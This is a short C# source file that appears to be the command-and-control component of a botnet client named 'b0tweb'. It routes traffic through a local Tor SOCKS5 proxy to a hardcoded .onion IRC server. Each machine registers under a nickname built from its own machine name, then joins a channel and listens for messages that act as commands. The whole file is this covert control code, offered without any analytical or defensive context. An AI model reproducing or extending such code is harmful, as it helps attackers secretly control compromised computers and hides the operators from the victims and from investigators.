using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Meebey.SmartIrc4net;

namespace b0tweb
{
    class IRCConnController
    {
        private IrcClient _irc;

        private const string _server = "botwebzoqpduhxj7hgbu2f6vooyj3lt3q6f6lxir7wb7xjilmvbzkzid.onion";
        private const int _port = 6667;

        private string _nick;
        private string _realName;

        IRCConnController()
        {
            Random rand = new Random();
            this._irc = new IrcClient();
            this._nick = "bot_" + System.Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
            this._realName = this._nick + "_real";

            this._irc.ProxyHost = "localhost";
            this._irc.ProxyPort = 9150;
            this._irc.ProxyType = ProxyType.Socks5;
        }

        public void AddMessageHandler (IrcEventHandler callback)
        {
            this._irc.OnChannelMessage += callback;
        }

        public void Join(string channel)
        {
            this._irc.Connect(_server, _port);
            this._irc.Login(_nick, _realName);
            this._irc.RfcJoin(channel);
        }

        public void Listen()
        {
            this._irc.Listen();
        }
    }
}
